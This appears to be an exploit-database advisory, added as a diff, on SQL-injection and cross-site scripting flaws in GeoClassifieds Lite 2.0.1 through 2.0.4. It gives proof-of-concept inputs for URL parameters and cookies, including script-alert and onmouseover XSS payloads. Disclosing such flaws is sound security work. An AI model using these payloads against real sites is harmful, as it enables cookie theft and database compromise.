@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/49475/info
+
+GeoClassifieds Lite is prone to multiple SQL-injection and cross-site scripting vulnerabilities.
+
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+GeoClassifieds Lite 2.0.1, 2.0.3.1, 2.0.3.2 and 2.0.4 are vulnerable; other versions may also be affected. 
+
+http://www.example.com/?a=19&c=id [SQL Attack]
+Cookie: language_id=1[SQL attack]
+Cookie: </div><script>alert('Xssed-By-Yassin');</script>
+http://www.example.com/index.php?a=19&c=</div><script>alert('Xssed By
+Yassin');</script>
+http://www.example.com/?a=19&c="+onmouseover=alert('Xssed-By-Yassin')+
